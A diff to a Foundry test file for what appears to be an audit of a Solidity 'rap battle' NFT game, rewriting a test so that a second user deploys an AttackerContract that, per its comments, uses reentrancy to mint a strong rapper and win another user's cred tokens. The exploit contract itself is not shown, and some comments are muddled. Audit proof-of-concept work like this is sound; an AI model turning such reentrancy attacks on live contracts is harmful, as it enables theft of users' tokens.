@@ -424,27 +424,43 @@ contract RapBattleTest is Test {
         assert(cred.balanceOf(address(user)) == 7);
     }
 
-    //test if user can crate a NFT with good stats;
-    function testMintRapperWithGoodStats() public {
-        vm.prank(user);
-        AttackerContract attacker = new AttackerContract(address(oneShot));
+    //test if user can go to battle with with good stats without improving his skill
+    function testMintRapperWithGoodStats() public mintRapper {
+
+        //create a new user 2 
+        address user2 = makeAddr("User2");
+
+        //give the 2 users 3 cred token
+        vm.prank(address(streets));
+        cred.mint(user, 3);
+        vm.prank(address(streets));
+        cred.mint(user2, 3);
+
+        // check they really have 3 cred token
+        assertEq(cred.balanceOf(user), 3);
+        assertEq(cred.balanceOf(user2), 3);
+
+        //user go on battle
+        vm.startPrank(user);
+        oneShot.approve(address(rapBattle), 0);
+        cred.approve(address(rapBattle), 3);
+        rapBattle.goOnStageOrBattle(0, 3);
+        vm.stopPrank();
+
+        //user3 create a Smart Contract and use reentrancy to mint a rapper with good stats 
+        //weakKnees = false, heavyArms = false , spaghettiSweater = false
+        vm.prank(user2);
+        AttackerContract attacker = new AttackerContract(address(oneShot), address(rapBattle));
 
         vm.prank(user);
-        attacker.attack();
+        attacker.attack(3);
 
         console.log("Owner of NFT 0 is ", oneShot.ownerOf(0));
-        console.log("Owner of NFT 0 is ", oneShot.ownerOf(1));
-        console.log("Owner of NFT 0 is ", oneShot.ownerOf(2));
 
-        //show nexid
-        console.log("Next id is ", oneShot.getNextTokenId());
+        //the user2 win the battle and get 3 cred token
+        console.log("User balance is ", cred.balanceOf(user2));
+    
 
-        stats = oneShot.getRapperStats(1);
-        assert(stats.weakKnees == true);
-        assert(stats.heavyArms == true);
-        assert(stats.spaghettiSweater == true);
-        assert(stats.calmAndReady == false);
-        assert(stats.battlesWon == 0);
     }
 
     function testGoOnBattleAndUpdateWinStats() public mintRapper {
